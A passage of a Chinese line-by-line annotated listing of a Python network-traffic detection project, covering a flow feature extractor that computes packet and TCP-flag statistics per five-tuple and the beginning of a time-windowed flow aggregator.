| 328 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                confidence=0.9,` |
| 329 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                details="Web 检测：未命中任何攻击规则",` |
| 330 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                source_ip=src_ip,` |
| 331 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                raw_data={"url_raw": url, "url_decoded": decoded_url},` |
| 332 | 代码语句：参与当前文件的业务流程或数据处理。 | `            ),` |
| 333 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            model_version=(` |
| 334 | 代码语句：参与当前文件的业务流程或数据处理。 | `                self._manifest.version if self._manifest is not None else "rules_only"` |
| 335 | 代码语句：参与当前文件的业务流程或数据处理。 | `            ),` |
| 336 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            schema_version=(` |
| 337 | 代码语句：参与当前文件的业务流程或数据处理。 | `                self._manifest.schema_version if self._manifest is not None else ""` |
| 338 | 代码语句：参与当前文件的业务流程或数据处理。 | `            ),` |
| 339 | 函数调用：执行已有函数/方法完成当前步骤。 | `        )` |

## `src/features/__init__.py`

- 类型：特征工程
- 行数：21

| 行号 | 备注 | 原始代码 |
|---:|---|---|
| 1 | 代码语句：参与当前文件的业务流程或数据处理。 | `﻿"""` |
| 2 | 代码语句：参与当前文件的业务流程或数据处理。 | `特征工程模块` |
| 3 | 代码语句：参与当前文件的业务流程或数据处理。 | `对应架构文档 §4` |
| 4 | 文档字符串边界：开始或结束模块/类/函数说明。 | `"""` |
| 5 | 导入对象：从指定模块引入类、函数或常量。 | `from .flow_features import FlowFeatureExtractor` |
| 6 | 导入对象：从指定模块引入类、函数或常量。 | `from .flow_window_aggregator import (` |
| 7 | 代码语句：参与当前文件的业务流程或数据处理。 | `    FlowWindowAggregator,` |
| 8 | 代码语句：参与当前文件的业务流程或数据处理。 | `    FlowWindowAggregatorConfig,` |
| 9 | 代码语句：参与当前文件的业务流程或数据处理。 | `    FlowWindowAggregatorCounters,` |
| 10 | 函数调用：执行已有函数/方法完成当前步骤。 | `)` |
| 11 | 导入对象：从指定模块引入类、函数或常量。 | `from .web_features import WebFeatureExtractor` |
| 12 | 导入对象：从指定模块引入类、函数或常量。 | `from .pipeline import FeaturePipeline` |
| 13 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 14 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `__all__ = [` |
| 15 | 代码语句：参与当前文件的业务流程或数据处理。 | `    'FlowFeatureExtractor',` |
| 16 | 代码语句：参与当前文件的业务流程或数据处理。 | `    'FlowWindowAggregator',` |
| 17 | 代码语句：参与当前文件的业务流程或数据处理。 | `    'FlowWindowAggregatorConfig',` |
| 18 | 代码语句：参与当前文件的业务流程或数据处理。 | `    'FlowWindowAggregatorCounters',` |
| 19 | 代码语句：参与当前文件的业务流程或数据处理。 | `    'WebFeatureExtractor',` |
| 20 | 代码语句：参与当前文件的业务流程或数据处理。 | `    'FeaturePipeline',` |
| 21 | 代码语句：参与当前文件的业务流程或数据处理。 | `]` |

## `src/features/flow_features.py`

- 类型：特征工程
- 行数：136

| 行号 | 备注 | 原始代码 |
|---:|---|---|
| 1 | 文档字符串边界：开始或结束模块/类/函数说明。 | `"""` |
| 2 | 代码语句：参与当前文件的业务流程或数据处理。 | `网络流量特征提取器` |
| 3 | 代码语句：参与当前文件的业务流程或数据处理。 | `对应架构文档 §4.2.1 网络流量特征` |
| 4 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 5 | 函数调用：执行已有函数/方法完成当前步骤。 | `基于五元组 (src_ip, src_port, dst_ip, dst_port, protocol) 对数据包进行流聚合，` |
| 6 | 代码语句：参与当前文件的业务流程或数据处理。 | `计算每条流的统计特征（包数、字节数、包长均值/方差、TCP 标志位分布等），` |
| 7 | 代码语句：参与当前文件的业务流程或数据处理。 | `供下游检测引擎（DDoS / 入侵检测 / 异常检测）使用。` |
| 8 | 文档字符串边界：开始或结束模块/类/函数说明。 | `"""` |
| 9 | 兼容性导入：启用较新的 Python 语义。 | `from __future__ import annotations` |
| 10 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 11 | 导入模块：引入标准库或第三方依赖供后续代码使用。 | `import logging` |
| 12 | 导入对象：从指定模块引入类、函数或常量。 | `from typing import Dict, List` |
| 13 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 14 | 导入模块：引入标准库或第三方依赖供后续代码使用。 | `import numpy as np` |
| 15 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 16 | 导入对象：从指定模块引入类、函数或常量。 | `from src.schema.feature_schemas import attach_network_flow_v1_block` |
| 17 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 18 | 日志记录：输出运行状态、调试信息或异常线索。 | `logger = logging.getLogger(__name__)` |
| 19 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 20 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 21 | 类定义：声明 `FlowFeatureExtractor`，封装相关状态与行为。 | `class FlowFeatureExtractor:` |
| 22 | 文档字符串边界：开始或结束模块/类/函数说明。 | `    """` |
| 23 | 代码语句：参与当前文件的业务流程或数据处理。 | `    基于五元组的流统计特征提取器。` |
| 24 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 25 | 代码语句：参与当前文件的业务流程或数据处理。 | `    工作机制：` |
| 26 | 函数调用：执行已有函数/方法完成当前步骤。 | `        1. \`\`extract()\`\` 被调用时，按五元组 key 对输入数据包分组；` |
| 27 | 代码语句：参与当前文件的业务流程或数据处理。 | `        2. 对于包数 >= 2 的流，计算统计特征（包数、字节数、包长均值/方差等）；` |
| 28 | 代码语句：参与当前文件的业务流程或数据处理。 | `        3. 统计 TCP 标志位（SYN/ACK/FIN/RST）数量；` |
| 29 | 代码语句：参与当前文件的业务流程或数据处理。 | `        4. 处理完成后清空内部流状态（无状态化批处理）。` |
| 30 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 31 | 代码语句：参与当前文件的业务流程或数据处理。 | `    Attributes:` |
| 32 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        timeout:     流超时时间（秒），超过此时间视为新流（预留字段，当前批处理模式未启用）。` |
| 33 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        _flows:      五元组 key 到流状态的映射。` |
| 34 | 文档字符串边界：开始或结束模块/类/函数说明。 | `    """` |
| 35 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 36 | 函数定义：声明 `__init__` 的输入、处理逻辑和返回结果。 | `    def __init__(self, timeout: float = 120.0) -> None:` |
| 37 | 文档字符串边界：开始或结束模块/类/函数说明。 | `        """` |
| 38 | 代码语句：参与当前文件的业务流程或数据处理。 | `        Args:` |
| 39 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            timeout: 流超时时间（秒），默认 120s。` |
| 40 | 文档字符串边界：开始或结束模块/类/函数说明。 | `        """` |
| 41 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        self.timeout: float = timeout` |
| 42 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        self._flows: Dict[str, dict] = {}` |
| 43 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 44 | 函数定义：声明 `_make_flow_key` 的输入、处理逻辑和返回结果。 | `    def _make_flow_key(self, packet: dict) -> str:` |
| 45 | 文档字符串边界：开始或结束模块/类/函数说明。 | `        """` |
| 46 | 代码语句：参与当前文件的业务流程或数据处理。 | `        生成五元组 key。` |
| 47 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 48 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        格式: \`\`{src_ip}:{src_port}-{dst_ip}:{dst_port}-{protocol}\`\`` |
| 49 | 文档字符串边界：开始或结束模块/类/函数说明。 | `        """` |
| 50 | 返回结果：把处理后的值交回调用方。 | `        return (` |
| 51 | 函数调用：执行已有函数/方法完成当前步骤。 | `            f"{packet.get('src_ip', '')}:{packet.get('src_port', 0)}-"` |
| 52 | 函数调用：执行已有函数/方法完成当前步骤。 | `            f"{packet.get('dst_ip', '')}:{packet.get('dst_port', 0)}-"` |
| 53 | 函数调用：执行已有函数/方法完成当前步骤。 | `            f"{packet.get('protocol', 'OTHER')}"` |
| 54 | 函数调用：执行已有函数/方法完成当前步骤。 | `        )` |
| 55 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 56 | 函数定义：声明 `extract` 的输入、处理逻辑和返回结果。 | `    def extract(self, packets: List[dict]) -> List[dict]:` |
| 57 | 文档字符串边界：开始或结束模块/类/函数说明。 | `        """` |
| 58 | 代码语句：参与当前文件的业务流程或数据处理。 | `        从数据包列表中提取流特征。` |
| 59 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 60 | 代码语句：参与当前文件的业务流程或数据处理。 | `        Args:` |
| 61 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            packets: 数据包字典列表，每个元素至少包含:` |
| 62 | 代码语句：参与当前文件的业务流程或数据处理。 | `                     src_ip / src_port / dst_ip / dst_port / protocol /` |
| 63 | 代码语句：参与当前文件的业务流程或数据处理。 | `                     timestamp / packet_len / tcp_flags。` |
| 64 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 65 | 代码语句：参与当前文件的业务流程或数据处理。 | `        Returns:` |
| 66 | 代码语句：参与当前文件的业务流程或数据处理。 | `            特征字典列表，每条流一条记录。仅返回包数 >= 2 的流。` |
| 67 | 文档字符串边界：开始或结束模块/类/函数说明。 | `        """` |
| 68 | 条件判断：满足条件时进入对应分支。 | `        if not packets:` |
| 69 | 返回结果：把处理后的值交回调用方。 | `            return []` |
| 70 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 71 | 注释：解释下面或当前这段代码的设计意图。 | `        # 1. 按五元组分组` |
| 72 | 循环：逐个处理集合或迭代器中的元素。 | `        for pkt in packets:` |
| 73 | 异常保护：尝试执行可能失败的逻辑。 | `            try:` |
| 74 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                key = self._make_flow_key(pkt)` |
| 75 | 异常处理：捕获错误并执行降级或记录逻辑。 | `            except Exception as exc:` |
| 76 | 日志记录：输出运行状态、调试信息或异常线索。 | `                logger.warning("[FlowFeatureExtractor] 跳过无效数据包: %s", exc)` |
| 77 | 继续循环：跳过本轮剩余逻辑。 | `                continue` |
| 78 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 79 | 条件判断：满足条件时进入对应分支。 | `            if key not in self._flows:` |
| 80 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                self._flows[key] = {` |
| 81 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                    'start_time': pkt.get('timestamp', 0.0),` |
| 82 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                    'packets': [],` |
| 83 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                    'src_ip': pkt.get('src_ip', ''),` |
| 84 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                    'dst_ip': pkt.get('dst_ip', ''),` |
| 85 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                    'protocol': pkt.get('protocol', 'OTHER'),` |
| 86 | 代码语句：参与当前文件的业务流程或数据处理。 | `                }` |
| 87 | 函数调用：执行已有函数/方法完成当前步骤。 | `            self._flows[key]['packets'].append(pkt)` |
| 88 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 89 | 注释：解释下面或当前这段代码的设计意图。 | `        # 2. 计算每个流的统计特征` |
| 90 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        features_list: List[dict] = []` |
| 91 | 循环：逐个处理集合或迭代器中的元素。 | `        for key, flow in self._flows.items():` |
| 92 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            pkts: List[dict] = flow['packets']` |
| 93 | 条件判断：满足条件时进入对应分支。 | `            if len(pkts) < 2:` |
| 94 | 继续循环：跳过本轮剩余逻辑。 | `                continue` |
| 95 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 96 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            pkt_lens = np.asarray(` |
| 97 | 函数调用：执行已有函数/方法完成当前步骤。 | `                [int(p.get('packet_len', 0)) for p in pkts], dtype=np.float64` |
| 98 | 函数调用：执行已有函数/方法完成当前步骤。 | `            )` |
| 99 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 100 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            features: dict = {` |
| 101 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                'src_ip': flow['src_ip'],` |
| 102 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                'dst_ip': flow['dst_ip'],` |
| 103 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                'protocol': flow['protocol'],` |
| 104 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                'src_port': int(pkts[0].get('src_port', 0)),` |
| 105 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                'dst_port': int(pkts[0].get('dst_port', 0)),` |
| 106 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                'flow_pkt_count': int(len(pkts)),` |
| 107 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                'flow_byte_count': int(pkt_lens.sum()),` |
| 108 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                'pkt_len_mean': float(np.mean(pkt_lens)),` |
| 109 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                'pkt_len_std': float(np.std(pkt_lens)),` |
| 110 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                'pkt_len_max': float(np.max(pkt_lens)),` |
| 111 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                'pkt_len_min': float(np.min(pkt_lens)),` |
| 112 | 代码语句：参与当前文件的业务流程或数据处理。 | `            }` |
| 113 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 114 | 注释：解释下面或当前这段代码的设计意图。 | `            # 3. TCP 标志位统计` |
| 115 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            syn_count = sum(1 for p in pkts if 'S' in str(p.get('tcp_flags', '')))` |
| 116 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            ack_count = sum(1 for p in pkts if 'A' in str(p.get('tcp_flags', '')))` |
| 117 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            fin_count = sum(1 for p in pkts if 'F' in str(p.get('tcp_flags', '')))` |
| 118 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            rst_count = sum(1 for p in pkts if 'R' in str(p.get('tcp_flags', '')))` |
| 119 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 120 | 函数调用：执行已有函数/方法完成当前步骤。 | `            features.update({` |
| 121 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                'syn_count': int(syn_count),` |
| 122 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                'ack_count': int(ack_count),` |
| 123 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                'fin_count': int(fin_count),` |
| 124 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                'rst_count': int(rst_count),` |
| 125 | 函数调用：执行已有函数/方法完成当前步骤。 | `            })` |
| 126 | 函数调用：执行已有函数/方法完成当前步骤。 | `            attach_network_flow_v1_block(features)` |
| 127 | 函数调用：执行已有函数/方法完成当前步骤。 | `            features_list.append(features)` |
| 128 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 129 | 日志记录：输出运行状态、调试信息或异常线索。 | `        logger.debug(` |
| 130 | 代码语句：参与当前文件的业务流程或数据处理。 | `            "[FlowFeatureExtractor] 本次处理 %d 个数据包，生成 %d 条流特征",` |
| 131 | 函数调用：执行已有函数/方法完成当前步骤。 | `            len(packets), len(features_list),` |
| 132 | 函数调用：执行已有函数/方法完成当前步骤。 | `        )` |
| 133 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 134 | 注释：解释下面或当前这段代码的设计意图。 | `        # 4. 清空流状态` |
| 135 | 函数调用：执行已有函数/方法完成当前步骤。 | `        self._flows.clear()` |
| 136 | 返回结果：把处理后的值交回调用方。 | `        return features_list` |

## `src/features/flow_window_aggregator.py`

- 类型：特征工程
- 行数：288

| 行号 | 备注 | 原始代码 |
|---:|---|---|
| 1 | 文档字符串边界：开始或结束模块/类/函数说明。 | `"""` |
| 2 | 代码语句：参与当前文件的业务流程或数据处理。 | `跨 tick 的流窗口聚合器（network_flow_v1）` |
| 3 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 4 | 代码语句：参与当前文件的业务流程或数据处理。 | `将实时抓包从「单包 extract 后清空」改为「按五元组累积，空闲超时后一次性输出」，` |
| 5 | 代码语句：参与当前文件的业务流程或数据处理。 | `满足 P0 实时检测链路：批量/滑动窗口聚合后再进入检测器。` |
| 6 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 7 | 代码语句：参与当前文件的业务流程或数据处理。 | `与 :class:\`FlowFeatureExtractor\` 解耦：后者仍用于无状态批处理与单元测试；` |
| 8 | 代码语句：参与当前文件的业务流程或数据处理。 | `本类在发射时对包数 >= 2 的流委托 \`\`FlowFeatureExtractor.extract\`\` 计算 TCP 统计等字段，` |
| 9 | 代码语句：参与当前文件的业务流程或数据处理。 | `并补充 \`\`packet_count\`\` / \`\`byte_count\`\` / 速率 / 源 IP 窗口内唯一目的等 schema 字段。` |
| 10 | 文档字符串边界：开始或结束模块/类/函数说明。 | `"""` |
| 11 | 兼容性导入：启用较新的 Python 语义。 | `from __future__ import annotations` |
| 12 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 13 | 导入模块：引入标准库或第三方依赖供后续代码使用。 | `import logging` |
| 14 | 导入模块：引入标准库或第三方依赖供后续代码使用。 | `import time` |
| 15 | 导入对象：从指定模块引入类、函数或常量。 | `from collections import Counter, defaultdict, deque` |
| 16 | 导入对象：从指定模块引入类、函数或常量。 | `from dataclasses import dataclass, field` |
| 17 | 导入对象：从指定模块引入类、函数或常量。 | `from datetime import datetime` |
| 18 | 导入对象：从指定模块引入类、函数或常量。 | `from typing import Any, DefaultDict, Deque, Dict, List, Optional, Tuple` |
| 19 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 20 | 导入对象：从指定模块引入类、函数或常量。 | `from src.schema.feature_schemas import attach_network_flow_v1_block` |
| 21 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 22 | 导入对象：从指定模块引入类、函数或常量。 | `from .flow_features import FlowFeatureExtractor` |
| 23 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 24 | 日志记录：输出运行状态、调试信息或异常线索。 | `logger = logging.getLogger(__name__)` |
| 25 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 26 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 27 | 函数定义：声明 `_packet_timestamp_seconds` 的输入、处理逻辑和返回结果。 | `def _packet_timestamp_seconds(packet: Dict[str, Any], fallback: float) -> float:` |
| 28 | 文档字符串：说明当前模块、类或函数的职责。 | `    """将包内 timestamp 规范为秒（float）。支持 Unix 秒与 ISO8601 字符串。"""` |
| 29 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    ts = packet.get("timestamp")` |
| 30 | 条件判断：满足条件时进入对应分支。 | `    if isinstance(ts, (int, float)):` |
| 31 | 返回结果：把处理后的值交回调用方。 | `        return float(ts)` |
| 32 | 条件判断：满足条件时进入对应分支。 | `    if isinstance(ts, str):` |
| 33 | 异常保护：尝试执行可能失败的逻辑。 | `        try:` |
| 34 | 注释：解释下面或当前这段代码的设计意图。 | `            # fromisoformat 兼容 '2026-04-28T12:00:00.123456'` |
| 35 | 条件判断：满足条件时进入对应分支。 | `            if ts.endswith("Z"):` |
| 36 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                ts = ts[:-1] + "+00:00"` |
| 37 | 返回结果：把处理后的值交回调用方。 | `            return datetime.fromisoformat(ts).timestamp()` |
| 38 | 异常处理：捕获错误并执行降级或记录逻辑。 | `        except (ValueError, TypeError):` |
| 39 | 占位语句：保持语法完整但当前不执行操作。 | `            pass` |
| 40 | 返回结果：把处理后的值交回调用方。 | `    return float(fallback)` |
| 41 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 42 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 43 | 函数定义：声明 `_make_flow_key` 的输入、处理逻辑和返回结果。 | `def _make_flow_key(packet: Dict[str, Any]) -> str:` |
| 44 | 返回结果：把处理后的值交回调用方。 | `    return (` |
| 45 | 函数调用：执行已有函数/方法完成当前步骤。 | `        f"{packet.get('src_ip', '')}:{packet.get('src_port', 0)}-"` |
| 46 | 函数调用：执行已有函数/方法完成当前步骤。 | `        f"{packet.get('dst_ip', '')}:{packet.get('dst_port', 0)}-"` |
| 47 | 函数调用：执行已有函数/方法完成当前步骤。 | `        f"{packet.get('protocol', 'OTHER')}"` |
| 48 | 函数调用：执行已有函数/方法完成当前步骤。 | `    )` |
| 49 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 50 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 51 | 装饰器：为下面的函数或类附加框架行为。 | `@dataclass` |
| 52 | 类定义：声明 `FlowWindowAggregatorConfig`，封装相关状态与行为。 | `class FlowWindowAggregatorConfig:` |
| 53 | 文档字符串：说明当前模块、类或函数的职责。 | `    """聚合器配置（可由环境变量 / RuntimeConfig 注入）。"""` |
| 54 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 55 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    min_flow_packets: int = 2` |
| 56 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    flow_idle_timeout_sec: float = 5.0` |
| 57 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    aggregation_window_sec: float = 10.0` |
| 58 | 注释：解释下面或当前这段代码的设计意图。 | `    # 单包流在空闲超时后：discard = 不输出；emit_low_confidence = 输出带低置信标记的特征` |
| 59 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    single_packet_idle_policy: str = "discard"  # discard \| emit_low_confidence` |
| 60 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 61 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 62 | 装饰器：为下面的函数或类附加框架行为。 | `@dataclass` |
| 63 | 类定义：声明 `FlowWindowAggregatorCounters`，封装相关状态与行为。 | `class FlowWindowAggregatorCounters:` |
| 64 | 文档字符串：说明当前模块、类或函数的职责。 | `    """可观测计数（主循环不依赖其成功）。"""` |
| 65 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 66 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    malformed_packet_skips: int = 0` |
| 67 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    single_packet_discarded: int = 0` |
| 68 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    partial_flow_discarded: int = 0` |
| 69 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    flows_emitted: int = 0` |
| 70 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    low_confidence_emissions: int = 0` |
| 71 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 72 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 73 | 装饰器：为下面的函数或类附加框架行为。 | `@dataclass` |
| 74 | 类定义：声明 `_FlowBuffer`，封装相关状态与行为。 | `class _FlowBuffer:` |
| 75 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    packets: List[Dict[str, Any]] = field(default_factory=list)` |
| 76 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    first_ts: float = 0.0` |
| 77 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    last_ts: float = 0.0` |
| 78 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 79 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 80 | 类定义：声明 `FlowWindowAggregator`，封装相关状态与行为。 | `class FlowWindowAggregator:` |
| 81 | 文档字符串边界：开始或结束模块/类/函数说明。 | `    """` |
| 82 | 代码语句：参与当前文件的业务流程或数据处理。 | `    按五元组维护流状态；在「流空闲超时」时输出一条聚合特征（tumbling）。` |
| 83 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 84 | 代码语句：参与当前文件的业务流程或数据处理。 | `    同一流在超时前持续累积包；超时且包数 >= min_flow_packets 时输出 1 条；` |
| 85 | 代码语句：参与当前文件的业务流程或数据处理。 | `    单包流在超时后按 \`\`single_packet_idle_policy\`\` 丢弃或低置信输出。` |
| 86 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 87 | 代码语句：参与当前文件的业务流程或数据处理。 | `    源 IP 滑动窗口（aggregation_window_sec）用于` |
| 88 | 代码语句：参与当前文件的业务流程或数据处理。 | `    \`\`window_unique_dst_ip\`\` / \`\`window_unique_dst_port\`\` / \`\`window_protocol_dist\`\`。` |
| 89 | 文档字符串边界：开始或结束模块/类/函数说明。 | `    """` |
| 90 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 91 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    SCHEMA_VERSION = "network_flow_v1"` |
| 92 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 93 | 函数定义：声明 `__init__` 的输入、处理逻辑和返回结果。 | `    def __init__(` |
| 94 | 代码语句：参与当前文件的业务流程或数据处理。 | `        self,` |
| 95 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        cfg: Optional[FlowWindowAggregatorConfig] = None,` |
| 96 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        extractor: Optional[FlowFeatureExtractor] = None,` |
| 97 | 代码语句：参与当前文件的业务流程或数据处理。 | `    ) -> None:` |
| 98 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        self.cfg = cfg or FlowWindowAggregatorConfig()` |
| 99 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        self._extractor = extractor or FlowFeatureExtractor()` |
| 100 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        self._flows: Dict[str, _FlowBuffer] = {}` |
| 101 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        self._src_activity: DefaultDict[str, Deque[Tuple[float, str, int, str]]] = (` |
| 102 | 函数调用：执行已有函数/方法完成当前步骤。 | `            defaultdict(deque)` |
| 103 | 函数调用：执行已有函数/方法完成当前步骤。 | `        )` |
| 104 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        self.counters = FlowWindowAggregatorCounters()` |
| 105 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 106 | 函数定义：声明 `reset` 的输入、处理逻辑和返回结果。 | `    def reset(self) -> None:` |
| 107 | 函数调用：执行已有函数/方法完成当前步骤。 | `        self._flows.clear()` |
| 108 | 函数调用：执行已有函数/方法完成当前步骤。 | `        self._src_activity.clear()` |
| 109 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        self.counters = FlowWindowAggregatorCounters()` |
| 110 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 111 | 函数定义：声明 `_prune_src_window` 的输入、处理逻辑和返回结果。 | `    def _prune_src_window(self, src_ip: str, now: float) -> None:` |
| 112 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        dq = self._src_activity.get(src_ip)` |
| 113 | 条件判断：满足条件时进入对应分支。 | `        if not dq:` |
| 114 | 返回结果：把处理后的值交回调用方。 | `            return` |
| 115 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        cutoff = now - self.cfg.aggregation_window_sec` |
| 116 | 循环：在条件成立期间重复执行逻辑。 | `        while dq and dq[0][0] < cutoff:` |
| 117 | 函数调用：执行已有函数/方法完成当前步骤。 | `            dq.popleft()` |
| 118 | 条件判断：满足条件时进入对应分支。 | `        if not dq:` |
| 119 | 代码语句：参与当前文件的业务流程或数据处理。 | `            del self._src_activity[src_ip]` |
| 120 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 121 | 函数定义：声明 `_record_src_window` 的输入、处理逻辑和返回结果。 | `    def _record_src_window(self, pkt: Dict[str, Any], ts: float) -> None:` |
| 122 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        src = str(pkt.get("src_ip", ""))` |
| 123 | 条件判断：满足条件时进入对应分支。 | `        if not src:` |
